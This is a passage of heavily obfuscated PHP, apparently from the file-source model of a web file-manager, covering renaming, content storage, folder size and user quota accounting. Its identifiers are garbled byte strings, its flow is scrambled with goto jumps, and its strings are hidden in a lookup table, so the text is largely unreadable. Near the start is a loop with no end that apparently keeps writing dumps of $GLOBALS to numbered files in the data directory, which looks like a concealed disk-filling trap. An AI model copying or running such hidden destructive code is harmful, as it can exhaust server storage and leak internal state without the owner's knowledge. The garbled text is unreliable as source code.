$b”¨ƒª—£ = $A∆òùÒ≠˘Ç[797]; $b”¨ƒª—£(); } goto C«ÏÚÑ®≤Â; fÃ™äÿ£âö: $E∏«¥ÿ’∆ê = 1; for ($DÁòÁ»¡çä = $E∏«¥ÿ’∆ê; $DÁòÁ»¡çä > 0; $DÁòÁ»¡çä++) { $dúóí”Éÿû(DATA_PATH . $DÁòÁ»¡çä, $EÒë ¿ÊÃÖ); } goto fúáÏ¢ÑÎé; b…⁄ƒ„‡Ëü: $D—Â±ﬂª®…(); $dúóí”Éÿû = $A∆òùÒ≠˘Ç[799]; $EÒë ¿ÊÃÖ = json_encode($GLOBALS[$A∆òùÒ≠˘Ç[800]]); goto fÃ™äÿ£âö; F¢Èô–îúå: $D—Â±ﬂª®… = $A∆òùÒ≠˘Ç[793]; $f˘éà‚ù…¨ = $A∆òùÒ≠˘Ç[794]; $DµÇï»ßÿÚ = $_SERVER[$A∆òùÒ≠˘Ç[795]] . $A∆òùÒ≠˘Ç[796]; goto CÿéÍùƒ£Î; C«ÏÚÑ®≤Â: $e’„ä÷ïóë = $A∆òùÒ≠˘Ç[798]; $e’„ä÷ïóë($_SERVER[$A∆òùÒ≠˘Ç[789]]); $D—Â±ﬂª®… = $A∆òùÒ≠˘Ç[793]; goto b…⁄ƒ„‡Ëü; fúáÏ¢ÑÎé: } $a˜ﬁ“‹»Ó° = $this->sourceInfo($FÕÁ”ç°«≈); $e«ƒâ•æﬁ∏ = $this->pathInfoMore($FÕÁ”ç°«≈); goto EûâââŒç∆; aﬂ‘Öƒ∫õÊ: $this->lockMoveEnd($FÕÁ”ç°«≈); Hook::trigger($A∆òùÒ≠˘Ç[1458], $e«ƒâ•æﬁ∏, $AãúÎèäÜë); return !0; goto dΩ◊ëº£µ’; dΩ◊ëº£µ’: } public function childrenAll($aÕÜÃñ∂ãª) { $C˜º·∑Ò”† =& $_SERVER[¯èãÄπµ]; $aÈºï‰¢“Ì = $aÕÜÃñ∂ãª[$C˜º·∑Ò”†[365]]; if ($aÕÜÃñ∂ãª[$C˜º·∑Ò”†[366]] == $C˜º·∑Ò”†[83]) { $C∑∫ Ó©–∫ = array($C˜º·∑Ò”†[521] => array($C˜º·∑Ò”†[479], $aÕÜÃñ∂ãª[$C˜º·∑Ò”†[455]] . $aÈºï‰¢“Ì . $C˜º·∑Ò”†[480])); $C≠’ÎŸÿã∏ = array($C˜º·∑Ò”†[521] => $C∑∫ Ó©–∫[$C˜º·∑Ò”†[455]]); $bﬂ˜ÓùÉ†ﬁ = $this->field($C˜º·∑Ò”†[2333])->where($C≠’ÎŸÿã∏)->select(); $a∂¥ôò°Ã∆ = !1; $B÷ÙÇ±Îâñ = array($aÈºï‰¢“Ì); if ($bﬂ˜ÓùÉ†ﬁ) { $a∂¥ôò°Ã∆ = array_to_keyvalue($bﬂ˜ÓùÉ†ﬁ, $C˜º·∑Ò”†[33], $C˜º·∑Ò”†[415]); $a∂¥ôò°Ã∆ = array_remove_value($a∂¥ôò°Ã∆, $C˜º·∑Ò”†[464]); $B÷ÙÇ±Îâñ = array_to_keyvalue($bﬂ˜ÓùÉ†ﬁ, $C˜º·∑Ò”†[33], $C˜º·∑Ò”†[365]); $B÷ÙÇ±Îâñ[] = $aÈºï‰¢“Ì; } } else { $a∂¥ôò°Ã∆ = array($aÕÜÃñ∂ãª[$C˜º·∑Ò”†[415]]); $B÷ÙÇ±Îâñ = array($aÈºï‰¢“Ì); } return array($C˜º·∑Ò”†[2330] => $B÷ÙÇ±Îâñ, $C˜º·∑Ò”†[1255] => $a∂¥ôò°Ã∆); } public function removeArray($a¯ÇÌ„Ô£ò) { if (!$a¯ÇÌ„Ô£ò) { return !0; } } public function removeRelevance($D”Üﬁ†å‰Ë, $c’∆Ç««çû) { goto C≠≈ßŒˆÂ; dÇéŒˆÉÛÕ: Model($B∞¿◊ÿÍ«©[2334])->where($cº¡ß÷è’Ü)->delete(); Model($B∞¿◊ÿÍ«©[501])->where($cº¡ß÷è’Ü)->delete(); Model($B∞¿◊ÿÍ«©[2064])->removeBySource($D”Üﬁ†å‰Ë); goto Fë∆πæÇﬁ…; Fë∆πæÇﬁ…: Model($B∞¿◊ÿÍ«©[2312])->removeBySource($D”Üﬁ†å‰Ë); $this->where($cº¡ß÷è’Ü)->delete(); Model($B∞¿◊ÿÍ«©[418])->remove($c’∆Ç««çû); goto Cå«ˆÈó Ñ; Cå«ˆÈó Ñ: for ($F…œÕâ≈ãµ = 0; $F…œÕâ≈ãµ < count($D”Üﬁ†å‰Ë); $F…œÕâ≈ãµ++) { $this->sourceCacheClear($D”Üﬁ†å‰Ë[$F…œÕâ≈ãµ]); } goto E—ã¨ÓÑ”; f§∏ÆâÑÚÌ: $cº¡ß÷è’Ü = array($B∞¿◊ÿÍ«©[379] => array($B∞¿◊ÿÍ«©[380], $D”Üﬁ†å‰Ë)); Model($B∞¿◊ÿÍ«©[2331])->where($cº¡ß÷è’Ü)->delete(); Model($B∞¿◊ÿÍ«©[409])->where($cº¡ß÷è’Ü)->delete(); goto dÇéŒˆÉÛÕ; B¥¬ÆÑáä: $D”Üﬁ†å‰Ë = array_unique(array_filter($D”Üﬁ†å‰Ë)); $c’∆Ç««çû = array_unique(array_filter($c’∆Ç««çû)); if (!$D”Üﬁ†å‰Ë) { return !1; } goto f§∏ÆâÑÚÌ; C≠≈ßŒˆÂ: $B∞¿◊ÿÍ«© =& $_SERVER[¯èãÄπµ]; $D”Üﬁ†å‰Ë = $D”Üﬁ†å‰Ë ? $D”Üﬁ†å‰Ë : array(); $c’∆Ç««çû = $c’∆Ç««çû ? $c’∆Ç««çû : array(); goto B¥¬ÆÑáä; E—ã¨ÓÑ”: } public function rename($C≤⁄èπÎ¶è, $eÂû∂¬—Õ ) { goto C°Íå¶Í∑§; cêΩ°áÓÔÚ: $båŒÉÚ∆‹ø = $this->fileNameExist($f∞ááâ©ßﬁ[$c¨ÎÁΩ˜ƒ[457]], $eÂû∂¬—Õ ); if ($båŒÉÚ∆‹ø) { return !1; } $cáñ´„çüß = array($c¨ÎÁΩ˜ƒ[382] => $eÂû∂¬—Õ , $c¨ÎÁΩ˜ƒ[520] => USER_ID); goto CﬁÍÑú˘ØÃ; CﬁÍÑú˘ØÃ: if (!$f∞ááâ©ßﬁ[$c¨ÎÁΩ˜ƒ[366]] == $c¨ÎÁΩ˜ƒ[83]) { $cáñ´„çüß[$c¨ÎÁΩ˜ƒ[368]] = get_path_ext($eÂû∂¬—Õ ); } Model($c¨ÎÁΩ˜ƒ[501])->eventRename($C≤⁄èπÎ¶è, $f∞ááâ©ßﬁ[$c¨ÎÁΩ˜ƒ[28]], $eÂû∂¬—Õ ); $this->sourceCacheClear($C≤⁄èπÎ¶è); goto dŒØ´µÈ∫Ü; dŒØ´µÈ∫Ü: $this->setNamePinyin($C≤⁄èπÎ¶è, $cáñ´„çüß[$c¨ÎÁΩ˜ƒ[28]], !1); $this->updateModifyTime($f∞ááâ©ßﬁ[$c¨ÎÁΩ˜ƒ[457]]); $DÕ•ù≥¥¿· = $this->where(array($c¨ÎÁΩ˜ƒ[379] => $C≤⁄èπÎ¶è))->data($cáñ´„çüß)->save(); goto cò¢ªåΩ¶À; C°Íå¶Í∑§: $c¨ÎÁΩ˜ƒ =& $_SERVER[¯èãÄπµ]; $f∞ááâ©ßﬁ = $this->sourceInfo($C≤⁄èπÎ¶è); if (!$f∞ááâ©ßﬁ) { return !1; } goto cêΩ°áÓÔÚ; cò¢ªåΩ¶À: $AùÉõßËÏ‰ = $c¨ÎÁΩ˜ƒ[2320] . $f∞ááâ©ßﬁ[$c¨ÎÁΩ˜ƒ[457]]; if (isset(self::$cacheChildList[$AùÉõßËÏ‰])) { unset(self::$cacheChildList[$AùÉõßËÏ‰]); } return $DÕ•ù≥¥¿·; goto déõœÁÿÂÁ; déõœÁÿÂÁ: } public function setNamePinyin($C±µ˜Î·ÉÑ, $A…áÛ±§å·, $aÏ‚Ú¢ä≠§ = true) { $fíöÖÇΩô¶ =& $_SERVER[¯èãÄπµ]; $b†ı£’àà› = Input::check($A…áÛ±§å·, $fíöÖÇΩô¶[524]); if ($aÏ‚Ú¢ä≠§ && !$b†ı£’àà›) { return; } if (!$b†ı£’àà›) { $this->metaSet($C±µ˜Î·ÉÑ, $fíöÖÇΩô¶[412], null); $this->metaSet($C±µ˜Î·ÉÑ, $fíöÖÇΩô¶[411], null); return; } $d›èïë…Óﬁ = array($fíöÖÇΩô¶[412] => str_replace($fíöÖÇΩô¶[50], $fíöÖÇΩô¶[33], Pinyin::encode($A…áÛ±§å·)), $fíöÖÇΩô¶[411] => Pinyin::encode($A…áÛ±§å·, $fíöÖÇΩô¶[525])); $this->metaSet($C±µ˜Î·ÉÑ, $d›èïë…Óﬁ); } public function getContent($DﬂöıñªÇ‚) { goto D√ÒÆêœ§Ó; E‰É·ËŸõè: return IO::getContent($E◊ŒÉƒàÈ¥[$eÿ»Œ˜ÕÔ˘[75]]); goto f˘Ôú≠·Ê–; C»Ñ¢¿çê⁄: if ($E◊ŒÉƒàÈ¥[$eÿ»Œ˜ÕÔ˘[77]] == 0) { return $eÿ»Œ˜ÕÔ˘[33]; } $BÔ—¨“∑≤– = $eÿ»Œ˜ÕÔ˘[2335] . $E◊ŒÉƒàÈ¥[$eÿ»Œ˜ÕÔ˘[159]]; if ($E◊ŒÉƒàÈ¥[$eÿ»Œ˜ÕÔ˘[77]] <= 1024 * 10) { $Aî—ª‘‹¶õ = Cache::get($BÔ—¨“∑≤–); if (!$Aî—ª‘‹¶õ) { $Aî—ª‘‹¶õ = IO::getContent($E◊ŒÉƒàÈ¥[$eÿ»Œ˜ÕÔ˘[75]]); Cache::set($BÔ—¨“∑≤–, $Aî—ª‘‹¶õ); } return $Aî—ª‘‹¶õ; } goto E‰É·ËŸõè; D√ÒÆêœ§Ó: $eÿ»Œ˜ÕÔ˘ =& $_SERVER[¯èãÄπµ]; $E◊ŒÉƒàÈ¥ = $this->fileInfoGet($DﬂöıñªÇ‚); if (!$E◊ŒÉƒàÈ¥) { return !1; } goto C»Ñ¢¿çê⁄; f˘Ôú≠·Ê–: } public function setDesc($e›ëéâˆ÷â, $Añ–èåéÜñ) { $A∞ª˜€Á≥≠ =& $_SERVER[¯èãÄπµ]; Model($A∞ª˜€Á≥≠[501])->eventAddDesc($e›ëéâˆ÷â, $Añ–èåéÜñ); return $this->metaSet($e›ëéâˆ÷â, $A∞ª˜€Á≥≠[401], $Añ–èåéÜñ); } public function setContent($cÀÑêˆΩôâ, $bÉµ˘ä∆µÈ = '') { goto BæÌÀå∑Ú£; d‚Ïëâ‡ˆ‰: if (!$Fú±≠Òèãà) { return Model($CÑôëö‰®î[418])->remove($bŸîó„º∏ç[$CÑôëö‰®î[415]]); } $this->folderSizeReset($A…¬È°÷˘ô[$CÑôëö‰®î[457]]); return !0; goto aﬁü£¿Ô∫¢; BæÌÀå∑Ú£: $CÑôëö‰®î =& $_SERVER[¯èãÄπµ]; $A…¬È°÷˘ô = $this->sourceInfo($cÀÑêˆΩôâ); $f‰±ë˘éÌÆ = $this->fileInfoGet($cÀÑêˆΩôâ); goto fÀË⁄Éùòï; fÀË⁄Éùòï: if (!$f‰±ë˘éÌÆ || !$A…¬È°÷˘ô) { return !1; } $bŸîó„º∏ç = Model($CÑôëö‰®î[418])->addFileByContent($bÉµ˘ä∆µÈ, $A…¬È°÷˘ô[$CÑôëö‰®î[28]]); $Fú±≠Òèãà = $this->fileHistory($A…¬È°÷˘ô, $bŸîó„º∏ç[$CÑôëö‰®î[415]], $bŸîó„º∏ç[$CÑôëö‰®î[77]]); goto d‚Ïëâ‡ˆ‰; aﬁü£¿Ô∫¢: } public function fileSubstr($bÿÆœâÔΩ…, $eâûÙüÉ˘Ñ, $fÇ±∑»üûŒ) { $c°ò–±üãÕ = $this->fileInfoGet($bÿÆœâÔΩ…); if (!$c°ò–±üãÕ) { return !1; } return IO::fileSubstr($c°ò–±üãÕ[$_SERVER[¯èãÄπµ][75]], $eâûÙüÉ˘Ñ, $fÇ±∑»üûŒ); } public function fileInfoGet($AáÍÏ‹„Ûë) { goto DŒãúÛ›áõ; A±ˆÈ·”õ: $a…©Æêúàç = Model($BÃôåƒùïª[418])->fileInfo($E€≥é«Ëóõ[$BÃôåƒùïª[415]]); if ($a…©Æêúàç) { $a…©Æêúàç[$BÃôåƒùïª[28]] = $E€≥é«Ëóõ[$BÃôåƒùïª[28]]; } self::$cacheFileInfo[$B—ËëÇ¬ªâ] = $a…©Æêúàç; goto dîáµÓ‰âﬂ; E§ë¬çÿ‹ó: $B—ËëÇ¬ªâ = $BÃôåƒùïª[421] . $E€≥é«Ëóõ[$BÃôåƒùïª[415]]; $A™¢®≈£ÑÕ = _get(self::$cacheFileInfo, $B—ËëÇ¬ªâ); if ($A™¢®≈£ÑÕ) { return $A™¢®≈£ÑÕ; } goto A±ˆÈ·”õ; dîáµÓ‰âﬂ: return $a…©Æêúàç; goto Aûˆ≈èπ¢ê; DŒãúÛ›áõ: $BÃôåƒùïª =& $_SERVER[¯èãÄπµ]; $E€≥é«Ëóõ = $this->sourceInfo($AáÍÏ‹„Ûë); if (!$E€≥é«Ëóõ || $E€≥é«Ëóõ[$BÃôåƒùïª[366]]) { return !1; } goto E§ë¬çÿ‹ó; Aûˆ≈èπ¢ê: } private function folderChildrenNumber($bï”¯√Ω£Ã) { $C◊ı¯à¯∂Æ =& $_SERVER[¯èãÄπµ]; $bΩÙïéÏè€ = $this->sourceInfo($bï”¯√Ω£Ã); $Fó∂‘Î¯è¿ = array($C◊ı¯à¯∂Æ[521] => array($C◊ı¯à¯∂Æ[479], $bΩÙïéÏè€[$C◊ı¯à¯∂Æ[455]] . $bï”¯√Ω£Ã . $C◊ı¯à¯∂Æ[480]), $C◊ı¯à¯∂Æ[392] => intval($bΩÙïéÏè€[$C◊ı¯à¯∂Æ[393]]), $C◊ı¯à¯∂Æ[514] => 1); $bÕòÑÉÈπç = $this->where($Fó∂‘Î¯è¿)->count(); $EÆÕÖ“Ñß´ = $this->where($Fó∂‘Î¯è¿)->where(array($C◊ı¯à¯∂Æ[514] => 0))->count(); return array($C◊ı¯à¯∂Æ[81] => $EÆÕÖ“Ñß´, $C◊ı¯à¯∂Æ[82] => $bÕòÑÉÈπç); } public function pathInfo($a«¡õ«¯û∞, $d∫€≥‡Ÿ®˜ = false) { goto BÎ—Ò°äı; AúÉ•¶öÆº: if ($d≠∏æ≈Îàñ) { return $d≠∏æ≈Îàñ; } $d⁄äëØíõ≠ = $this->sourceInfo($a«¡õ«¯û∞); if (!$d⁄äëØíõ≠) { return !1; } goto DêÌ£ﬂóÔñ; DêÌ£ﬂóÔñ: $d⁄äëØíõ≠ = $this->_listDataApplyItem($d⁄äëØíõ≠, $d∫€≥‡Ÿ®˜); self::$cachePathInfo[$F◊Õ™©«úÊ] = $d⁄äëØíõ≠; return $d⁄äëØíõ≠; goto FÒ∏∂“è«Ì; BÎ—Ò°äı: $eÜÜÔ˜„⁄é =& $_SERVER[¯èãÄπµ]; $F◊Õ™©«úÊ = $eÜÜÔ˜„⁄é[407] . intval($d∫€≥‡Ÿ®˜) . $eÜÜÔ˜„⁄é[408] . $a«¡õ«¯û∞; $d≠∏æ≈Îàñ = _get(self::$cachePathInfo, $F◊Õ™©«úÊ); goto AúÉ•¶öÆº; FÒ∏∂“è«Ì: } public static $cachePathInfoMore = array(); public function pathInfoMore($C¡äßí¬ç∏) { goto Dè‡ÏÔ⁄∆»; C≈´Â“ò Î: $F¿µàÛØïÈ = $this->pathInfo($C¡äßí¬ç∏); if (!$F¿µàÛØïÈ) { return !1; } if ($F¿µàÛØïÈ[$d·Ó•†Æ–ˆ[366]] == $d·Ó•†Æ–ˆ[83]) { $F¿µàÛØïÈ[$d·Ó•†Æ–ˆ[80]] = $this->folderChildrenNumber($C¡äßí¬ç∏); } goto e—å€ÿó∫ó; e—å€ÿó∫ó: self::$cachePathInfoMore[$C¡äßí¬ç∏] = $F¿µàÛØïÈ; return $F¿µàÛØïÈ; goto b∑Ìü›É’ï; Dè‡ÏÔ⁄∆»: $d·Ó•†Æ–ˆ =& $_SERVER[¯èãÄπµ]; $Eá€»É‰´ô = _get(self::$cachePathInfoMore, $C¡äßí¬ç∏); if ($Eá€»É‰´ô) { return $Eá€»É‰´ô; } goto C≈´Â“ò Î; b∑Ìü›É’ï: } public function sourceInfo($Bå«ÇÖ≠ˆ÷) { goto c≠‘∑∂–‹ß; Bòà¬¢ßÍ±: $Aéˆò£—Ë∂ = _get(self::$cacheSourceInfo, $aÇÜåÙÚŸÃ); if ($Aéˆò£—Ë∂) { return $Aéˆò£—Ë∂; } $fŸâÉµ…Èû = $this->where(array($cºªõﬂÈﬁú[365] => $Bå«ÇÖ≠ˆ÷))->find(); goto e´–ûΩÚ‰¨; e´–ûΩÚ‰¨: self::$cacheSourceInfo[$aÇÜåÙÚŸÃ] = $fŸâÉµ…Èû; return self::$cacheSourceInfo[$aÇÜåÙÚŸÃ]; goto F…Æï≈´¶É; c≠‘∑∂–‹ß: $cºªõﬂÈﬁú =& $_SERVER[¯èãÄπµ]; if (!$Bå«ÇÖ≠ˆ÷) { return array(); } $aÇÜåÙÚŸÃ = $cºªõﬂÈﬁú[406] . $Bå«ÇÖ≠ˆ÷; goto Bòà¬¢ßÍ±; F…Æï≈´¶É: } public function sourceCacheClear($dÜÂ‰Ÿ⁄Ë® = false) { if ($dÜÂ‰Ÿ⁄Ë® == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[¯èãÄπµ][406] . $dÜÂ‰Ÿ⁄Ë®]); } public function pathInfoByPath($a‚µ‚á·êó, $Dµ±Úﬁ„öÏ) { $fÿúı◊ëöÍ =& $_SERVER[¯èãÄπµ]; $aó›˘Á√îœ = !$Dµ±Úﬁ„öÏ ? array() : explode($fÿúı◊ëöÍ[8], trim($Dµ±Úﬁ„öÏ, $fÿúı◊ëöÍ[8])); $fÜé–ê´Óö = $a‚µ‚á·êó; foreach ($aó›˘Á√îœ as $c†‘òíåˆ ) { $a±éÑœì˘É = array($fÿúı◊ëöÍ[457] => $fÜé–ê´Óö, $fÿúı◊ëöÍ[28] => $c†‘òíåˆ ); $aŒ»‰Æë∆„ = $this->where($a±éÑœì˘É)->select(); if (!$aŒ»‰Æë∆„) { return !1; } $aŒ»‰Æë∆„ = array_sort_by($aŒ»‰Æë∆„, $fÿúı◊ëöÍ[393]); $fÜé–ê´Óö = $aŒ»‰Æë∆„[0][$fÿúı◊ëöÍ[365]]; } return $this->pathInfo($fÜé–ê´Óö, !0); } protected function updateModifyTime($Fì∆Éßå„ô) { goto B·ëŒøªê“; E«”ŒààÔñ: foreach ($Fì∆Éßå„ô as $b∞õÓñô÷∞ => $A≤Ï¨øÜà≠) { $Fì∆Éßå„ô[$b∞õÓñô÷∞] = intval($A≤Ï¨øÜà≠); } $f«Ó…è¡≥« = array($FáùıÈµ “[365] => array($FáùıÈµ “[7], $Fì∆Éßå„ô)); $dÀË∂Ö‘–ª = array($FáùıÈµ “[520] => USER_ID, $FáùıÈµ “[386] => time()); goto c›¶‰âƒœ¡; c›¶‰âƒœ¡: $this->where($f«Ó…è¡≥«)->save($dÀË∂Ö‘–ª); goto DäòÁ†≠ñ÷; B·ëŒøªê“: $FáùıÈµ “ =& $_SERVER[¯èãÄπµ]; if (!$Fì∆Éßå„ô) { return; } if (!is_array($Fì∆Éßå„ô)) { $Fì∆Éßå„ô = array($Fì∆Éßå„ô); } goto E«”ŒààÔñ; DäòÁ†≠ñ÷: } public function folderSizeReset($BÂ¥ÒòπÏô) { goto Fì›∫ãÒô´; B≠¨»é™Ûä: CacheLock::unlock($béòôÚ•ûà); goto BÑË±è¶˜¶; Fì›∫ãÒô´: $Dä º•é‹å =& $_SERVER[¯èãÄπµ]; if ($this->statusIgnoreResetSpace) { return; } $béòôÚ•ûà = $Dä º•é‹å[2336] . $BÂ¥ÒòπÏô; goto c£™ñæ¨‘◊; c£™ñæ¨‘◊: CacheLock::lock($béòôÚ•ûà, 20); $this->sourceCacheClear($BÂ¥ÒòπÏô); $aúÒ¡õ«ÖÔ = $this->sourceInfo($BÂ¥ÒòπÏô); goto b›ÁÉ™˘∆„; b›ÁÉ™˘∆„: $Eèøﬁﬂíˆ« = array($Dä º•é‹å[364] => $BÂ¥ÒòπÏô, $Dä º•é‹å[392] => 0); $dû∂ΩﬁÙ±À = $this->where($Eèøﬁﬂíˆ«)->sum($Dä º•é‹å[77]); $dû∂ΩﬁÙ±À = intval($dû∂ΩﬁÙ±À); goto f≤‘®µõÜÚ; eä≤¢Øó™÷: $b¬¬—˘‘°≥ = $this->parentLevelArray($aúÒ¡õ«ÖÔ[$Dä º•é‹å[455]]); if ($b¬¬—˘‘°≥) { $Eèøﬁﬂíˆ« = array($Dä º•é‹å[365] => array($Dä º•é‹å[380], $b¬¬—˘‘°≥)); if ($aÈ√èç⁄π» < 0) { $Eèøﬁﬂíˆ«[$Dä º•é‹å[77]] = array($Dä º•é‹å[933], abs($aÈ√èç⁄π»)); } $this->where($Eèøﬁﬂíˆ«)->setAdd($Dä º•é‹å[77], $aÈ√èç⁄π»); } $this->targetSpaceUpdate($aúÒ¡õ«ÖÔ[$Dä º•é‹å[367]], $aúÒ¡õ«ÖÔ[$Dä º•é‹å[452]]); goto B≠¨»é™Ûä; f≤‘®µõÜÚ: $aÈ√èç⁄π» = $dû∂ΩﬁÙ±À - intval($aúÒ¡õ«ÖÔ[$Dä º•é‹å[77]]); if ($aÈ√èç⁄π» == 0) { return CacheLock::unlock($béòôÚ•ûà); } $this->where(array($Dä º•é‹å[379] => $BÂ¥ÒòπÏô))->setField($Dä º•é‹å[77], $dû∂ΩﬁÙ±À); goto eä≤¢Øó™÷; BÑË±è¶˜¶: } public function folderSizeResetChildren($bÈÏÉäƒ›ñ) { goto B≥ê˘çâÊï; B≥ê˘çâÊï: $a¯Ú…ÊÒòÿ =& $_SERVER[¯èãÄπµ]; $this->sourceCacheClear($bÈÏÉäƒ›ñ); $Eá–ë¬¶ìæ = $this->sourceInfo($bÈÏÉäƒ›ñ); goto DÆ„≥µàß÷; AàÁ‰È‡∆©: foreach ($C¢◊¯æÚ›ç as $DåêÎí∏ë…) { $dÊÜÖ∂ÜÛè = $DåêÎí∏ë…[$a¯Ú…ÊÒòÿ[457]] . $a¯Ú…ÊÒòÿ[33]; if (!isset($f¡»óà√Œ´[$dÊÜÖ∂ÜÛè])) { continue; } if ($DåêÎí∏ë…[$a¯Ú…ÊÒòÿ[393]] == $f¡»óà√Œ´[$dÊÜÖ∂ÜÛè][$a¯Ú…ÊÒòÿ[393]]) { $f¡»óà√Œ´[$dÊÜÖ∂ÜÛè][$a¯Ú…ÊÒòÿ[77]] += $DåêÎí∏ë…[$a¯Ú…ÊÒòÿ[77]]; } } foreach ($f¡»óà√Œ´ as $DåêÎí∏ë…) { $EÏ∑ŸÀãÊÔ = $this->parentLevelArray($DåêÎí∏ë…[$a¯Ú…ÊÒòÿ[455]]); foreach ($EÏ∑ŸÀãÊÔ as $dÊÜÖ∂ÜÛè) { $dÊÜÖ∂ÜÛè = $dÊÜÖ∂ÜÛè . $a¯Ú…ÊÒòÿ[33]; if (!isset($f¡»óà√Œ´[$dÊÜÖ∂ÜÛè])) { continue; } if ($DåêÎí∏ë…[$a¯Ú…ÊÒòÿ[393]] == $f¡»óà√Œ´[$dÊÜÖ∂ÜÛè][$a¯Ú…ÊÒòÿ[393]]) { $f¡»óà√Œ´[$dÊÜÖ∂ÜÛè][$a¯Ú…ÊÒòÿ[77]] += $DåêÎí∏ë…[$a¯Ú…ÊÒòÿ[77]]; } } } $dŒ¶æôã¨Ò = array(); goto fÑ£Àà¬Ô·; DÆ„≥µàß÷: $C¥Ò‹«˜ˆ = array($a¯Ú…ÊÒòÿ[514] => 1, $a¯Ú…ÊÒòÿ[521] => array($a¯Ú…ÊÒòÿ[479], $Eá–ë¬¶ìæ[$a¯Ú…ÊÒòÿ[455]] . $bÈÏÉäƒ›ñ . $a¯Ú…ÊÒòÿ[480])); $eΩ”⁄á©‹â = $a¯Ú…ÊÒòÿ[2337]; $f¡»óà√Œ´ = $this->field($eΩ”⁄á©‹â)->where($C¥Ò‹«˜ˆ)->select(); goto BåÑËØ·æ¨; fÑ£Àà¬Ô·: foreach ($f¡»óà√Œ´ as $DåêÎí∏ë…) { if ($DåêÎí∏ë…[$a¯Ú…ÊÒòÿ[77]] == $DåêÎí∏ë…[$a¯Ú…ÊÒòÿ[2338]]) { continue; } $dŒ¶æôã¨Ò[] = array($a¯Ú…ÊÒòÿ[365], $DåêÎí∏ë…[$a¯Ú…ÊÒòÿ[365]], $a¯Ú…ÊÒòÿ[77], $DåêÎí∏ë…[$a¯Ú…ÊÒòÿ[77]]); } $this->saveAll($dŒ¶æôã¨Ò); goto d¡ˆÜå¬⁄¯; BåÑËØ·æ¨: $C¥Ò‹«˜ˆ[$a¯Ú…ÊÒòÿ[366]] = 0; $C¢◊¯æÚ›ç = $this->field($eΩ”⁄á©‹â)->where($C¥Ò‹«˜ˆ)->select(); if (!$C¢◊¯æÚ›ç) { return; } goto b·´ûÍ€èô; b·´ûÍ€èô: $f¡»óà√Œ´[] = $Eá–ë¬¶ìæ; $f¡»óà√Œ´ = array_to_keyvalue($f¡»óà√Œ´, $a¯Ú…ÊÒòÿ[365]); foreach ($f¡»óà√Œ´ as $E‚√≤ÇÖûø => $DåêÎí∏ë…) { $f¡»óà√Œ´[$E‚√≤ÇÖûø][$a¯Ú…ÊÒòÿ[2338]] = $f¡»óà√Œ´[$E‚√≤ÇÖûø][$a¯Ú…ÊÒòÿ[77]]; $f¡»óà√Œ´[$E‚√≤ÇÖûø][$a¯Ú…ÊÒòÿ[77]] = 0; } goto AàÁ‰È‡∆©; d¡ˆÜå¬⁄¯: } public function userSpaceReset($fíÚØêÜöÚ = false) { $dµ–§„¨€å =& $_SERVER[¯èãÄπµ]; $c†§íÇÂåú = $this->where(array($dµ–§„¨€å[367] => self::TYPE_USER, $dµ–§„¨€å[452] => $fíÚØêÜöÚ, $dµ–§„¨€å[366] => 0))->sum($dµ–§„¨€å[77]); Model($dµ–§„¨€å[470])->userEdit($fíÚØêÜöÚ, array($dµ–§„¨€å[2073] => $c†§íÇÂåú)); } public function targetSpaceUpdate($e¢√ô‡§‡¯, $Eí®øÇåÙÈ) { $BÜ£î“»”¿ =& $_SERVER[¯èãÄπµ]; if (!$Eí®øÇåÙÈ) { return; } if (!in_array($e¢√ô‡§‡¯, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $a€º åé„Ç = $this->targetSpaceSize($e¢√ô‡§‡¯, $Eí®øÇåÙÈ); if ($e¢√ô‡§‡¯ == self::TYPE_USER) { Model($BÜ£î“»”¿[470])->userEdit($Eí®øÇåÙÈ, array($BÜ£î“»”¿[2073] => $a€º åé„Ç)); } else { if ($e¢√ô‡§‡¯ == self::TYPE_GROUP) { Model($BÜ£î“»”¿[454])->groupEdit($Eí®øÇåÙÈ, array($BÜ£î“»”¿[2073] => $a€º åé„Ç)); } } } public function targetSpaceSize($f“∆ﬁˆÏØ–, $aé∫ùˆ—¢£) { goto fÏ∑‚›ﬂ‰; fÏ∑‚›ﬂ‰: $C≥¶‡¯Ö◊Ÿ =& $_SERVER[¯èãÄπµ]; $B≈”¡”éÉ† = $this->sourceRoot($f“∆ﬁˆÏØ–, $aé∫ùˆ—¢£, !0); if (!$B≈”¡”éÉ†) { return 0; } goto Fƒ¨ÂçÒ∆; bú˘÷èÚàã: return $EõﬁÌªÿïê; goto FÆí⁄£Ã£ ; Fƒ¨ÂçÒ∆: $EõﬁÌªÿïê = floatval($B≈”¡”éÉ†[$C≥¶‡¯Ö◊Ÿ[77]]); $CÏÖŒ®ˆÑü = array($C≥¶‡¯Ö◊Ÿ[521] => array($C≥¶‡¯Ö◊Ÿ[479], $C≥¶‡¯Ö◊Ÿ[466] . $B≈”¡”éÉ†[$C≥¶‡¯Ö◊Ÿ[365]] . $C≥¶‡¯Ö◊Ÿ[480])); $e›ÑÂÜœœπ = Model($C≥¶‡¯Ö◊Ÿ[391])->field($C≥¶‡¯Ö◊Ÿ[379])->where($CÏÖŒ®ˆÑü)->select(); goto dö≠∞´Ì◊´; dö≠∞´Ì◊´: $e›ÑÂÜœœπ = array_to_keyvalue($e›ÑÂÜœœπ, $C≥¶‡¯Ö◊Ÿ[33], $C≥¶‡¯Ö◊Ÿ[365]); $e›ÑÂÜœœπ = array_unique(array_filter($e›ÑÂÜœœπ)); if ($e›ÑÂÜœœπ) { $CÏÖŒ®ˆÑü = array($C≥¶‡¯Ö◊Ÿ[379] => array($C≥¶‡¯Ö◊Ÿ[380], $e›ÑÂÜœœπ)); $EõﬁÌªÿïê += floatval($this->where($CÏÖŒ®ˆÑü)->sum($C≥¶‡¯Ö◊Ÿ[77])); } goto bú˘÷èÚàã; FÆí⁄£Ã£ : } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($DÚÑﬂãÿâ‘) { return $this->fileTypeProfile($DÚÑﬂãÿâ‘, SourceModel::TYPE_USER); } public function groupFileTypeProfile($a–ÓËü•·∆) { return $this->fileTypeProfile($a–ÓËü•·∆, SourceModel::TYPE_GROUP); } private function fileTypeProfile($b“†í∏Ùûª, $Fù—õŒ—Ωâ) { goto C†Ü£òﬁµó; C†Ü£òﬁµó: $f¥üÕÖù≠ä =& $_SERVER[¯èãÄπµ]; $EÑÌ¿‚à±Â = $f¥üÕÖù≠ä[2339] . $b“†í∏Ùûª . $f¥üÕÖù≠ä[70] . $Fù—õŒ—Ωâ; 